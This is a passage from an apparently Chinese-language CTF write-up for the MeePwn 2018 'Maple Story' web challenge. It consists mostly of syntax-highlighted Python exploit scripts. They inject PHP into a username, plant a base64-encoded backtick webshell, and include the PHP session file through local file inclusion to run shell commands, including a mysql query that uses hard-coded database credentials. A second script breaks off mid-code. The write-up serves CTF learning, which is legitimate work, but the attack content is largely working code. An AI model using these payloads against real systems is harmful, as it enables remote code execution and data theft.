</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-37>37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-38><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-38>38</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-39><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-39>39</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-40><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-40>40</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-41><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-41>41</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-42><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-42>42</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-43><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-43>43</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-44><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-44>44</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-45><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-45>45</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-46><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-46>46</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-47><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-47>47</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-48><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-48>48</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># -*- coding: utf-8 -*-</span>
</span></span><span style=display:flex><span><span style=color:#75715e># by https://findneo.github.io/</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests<span style=color:#f92672>,</span> hashlib<span style=color:#f92672>,</span> base64
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>change_name</span>(character_name):
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> dict(name<span style=color:#f92672>=</span>character_name, submit<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;Edit&#39;</span>)
</span></span><span style=display:flex><span>    r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(url <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;?page=setting.php&#34;</span>, cookies<span style=color:#f92672>=</span>cookie, data<span style=color:#f92672>=</span>payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>give_pet</span>(user_email):
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> dict(pet<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;babydragon&#34;</span>, email<span style=color:#f92672>=</span>user_email, submit<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Give&#34;</span>)
</span></span><span style=display:flex><span>    r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(url <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;?page=admin.php&#39;</span>, cookies<span style=color:#f92672>=</span>cookie, data<span style=color:#f92672>=</span>payload)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> r<span style=color:#f92672>.</span>content
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>command</span>(cmd<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;testcmd&#34;</span>):
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> dict(command<span style=color:#f92672>=</span>cmd, submit<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Send&#34;</span>)
</span></span><span style=display:flex><span>    r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(
</span></span><span style=display:flex><span>        url <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;?page=character.php&#34;</span>, cookies<span style=color:#f92672>=</span>cookie, data<span style=color:#f92672>=</span>payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>shell</span>(cmd<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;uname&#39;</span>):
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> dict(
</span></span><span style=display:flex><span>        page<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/var/lib/php/sessions/sess_&#34;</span> <span style=color:#f92672>+</span> cookie[<span style=color:#e6db74>&#39;PHPSESSID&#39;</span>], f<span style=color:#f92672>=</span>cmd)
</span></span><span style=display:flex><span>    r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(url, cookies<span style=color:#f92672>=</span>cookie, params<span style=color:#f92672>=</span>payload)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> r<span style=color:#f92672>.</span>content
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># edit your cookie[&#39;PHPSESSID&#39;] &amp; user_email to run this script</span>
</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://178.128.87.16/&#34;</span>
</span></span><span style=display:flex><span>user_email <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;ojbk@qq.com&#34;</span>
</span></span><span style=display:flex><span>salt <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;ms_g00d_0ld_g4m3&#39;</span>
</span></span><span style=display:flex><span>cookie <span style=color:#f92672>=</span> dict(
</span></span><span style=display:flex><span>    PHPSESSID<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;8es749ivbfetvsmsc0ggthr2e5&#39;</span>,
</span></span><span style=display:flex><span>    _role<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;a2ae9db7fd12a8911be74590b99bc7ad1f2f6ccd2e68e44afbf1280349205054&#39;</span>,
</span></span><span style=display:flex><span>    a<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;php://filter/convert.base64-decode/resource=upload/</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>/command.txt&#34;</span> <span style=color:#f92672>%</span>
</span></span><span style=display:flex><span>    hashlib<span style=color:#f92672>.</span>md5(salt <span style=color:#f92672>+</span> user_email)<span style=color:#f92672>.</span>hexdigest())
</span></span><span style=display:flex><span>change_name(<span style=color:#e6db74>&#39;&lt;?=include&#34;$_COOKIE[a]&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#75715e># 修改用户名使读Session文件时包含进Cookie[&#39;a&#39;]，即command.txt得base64解码</span>
</span></span><span style=display:flex><span>cmd <span style=color:#f92672>=</span> base64<span style=color:#f92672>.</span>b64encode(<span style=color:#e6db74>&#34;&lt;?=`$_GET[f]`;&#34;</span>)  <span style=color:#75715e>#&#39;PD89YCRfR0VUW2ZdYDs=&#39;</span>
</span></span><span style=display:flex><span>command(cmd[:<span style=color:#ae81ff>19</span>])  <span style=color:#75715e># 往command.txt写入base64编码的shell，缺少最后一个等号也可正常解码</span>
</span></span><span style=display:flex><span>give_pet(user_email)  <span style=color:#75715e># 使Session文件中的action值为&#34;Give $pet to  player $username&#34;</span>
</span></span><span style=display:flex><span>cmd <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;mysql -e&#39;select * from mapl_config&#39; -umapl_story_user -ptsu_tsu_tsu_tsu mapl_story&#34;</span>
</span></span><span style=display:flex><span>print shell(cmd)
</span></span><span style=display:flex><span><span style=color:#75715e># mapl_salt      mapl_key        mapl_now_get_your_flag</span>
</span></span><span style=display:flex><span><span style=color:#75715e># ms_g00d_0ld_g4m3        You_Never_Guess_This_Tsug0d_1337        MeePwnCTF{__Abus1ng_SessioN_Is_AlwAys_C00L_1337!___}</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=另一种思路拼接_session-变量>另一种思路：拼接<code>$_SESSION</code> 变量<a hidden class=anchor aria-hidden=true href=#另一种思路拼接_session-变量>#</a></h1><p>另外， <a href=https://movrment.blogspot.com/2018/07/meepwn-ctf-2018-qual-maple-s.html>这篇文章</a> 里提供的一种拼接<code>$_SESSION</code> 变量的做法虽不比前者综合利用多处缺陷的优雅，但最大化地利用了单点的缺陷，很有创意，值得学习。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-36>36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-37>37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-38><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-38>38</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-39><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-39>39</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-40><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-40>40</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-41><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-41>41</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-42><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-42>42</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-43><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-43>43</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-44><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-44>44</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-45><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-45>45</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-46><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-46>46</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-47><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-47>47</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-48><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-48>48</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-49><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-49>49</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-50><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-50>50</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-51><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-51>51</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-52><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-52>52</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-53><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-53>53</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-54><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-54>54</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-55><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-55>55</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-56><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-56>56</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-57><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-57>57</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-58><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-58>58</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-59><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-59>59</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-60><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-60>60</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-61><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-61>61</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-62><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-62>62</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-63><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-63>63</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-64><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-64>64</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-65><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-65>65</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-66><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-66>66</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-67><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-67>67</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-68><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-68>68</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-69><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-69>69</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-70><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-70>70</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-71><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-71>71</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-72><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-72>72</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-73><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-73>73</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-74><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-74>74</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-75><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-75>75</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-76><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-76>76</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-77><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-77>77</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-78><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-78>78</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-79><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-79>79</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># -*- coding: utf-8 -*-</span>
</span></span><span style=display:flex><span><span style=color:#75715e># by https://findneo.github.io/</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests<span style=color:#f92672>,</span> hashlib<span style=color:#f92672>,</span> base64
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>change_name</span>(character_name):
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> dict(name<span style=color:#f92672>=</span>character_name, submit<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;Edit&#39;</span>)
</span></span><span style=display:flex><span>    r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(url <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;?page=setting.php&#34;</span>, cookies<span style=color:#f92672>=</span>cookie, data<span style=color:#f92672>=</span>payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>give_pet</span>(user_email):
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> dict(pet<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;babydragon&#34;</span>, email<span style=color:#f92672>=</span>user_email, submit<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Give&#34;</span>)
</span></span><span style=display:flex><span>    r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(url <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;?page=admin.php&#39;</span>, cookies<span style=color:#f92672>=</span>cookie, data<span style=color:#f92672>=</span>payload)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> r<span style=color:#f92672>.</span>content
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>shell</span>(cmd<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;uname&#39;</span>):
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> dict(
</span></span><span style=display:flex><span>        page<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/var/lib/php/sessions/sess_&#34;</span> <span style=color:#f92672>+</span> cookie[<span style=color:#e6db74>&#39;PHPSESSID&#39;</span>], f<span style=color:#f92672>=</span>cmd)
</span></span><span style=display:flex><span>    r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(url, cookies<span style=color:#f92672>=</span>cookie, params<span style=color:#f92672>=</span>payload)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> r<span style=color:#f92672>.</span>content
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># edit your cookie[&#39;PHPSESSID&#39;] &amp; user_email to run this script</span>
</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://178.128.87.16/&#34;</span>
</span></span><span style=display:flex><span>user_email <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;mapl@qq.com&#34;</span>
</span></span><span style=display:flex><span>salt <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;ms_g00d_0ld_g4m3&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>cookie <span style=color:#f92672>=</span> dict(
</span></span><span style=display:flex><span>    PHPSESSID<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;8es749ivbfetvsmsc0ggthr2e5&#39;</span>,
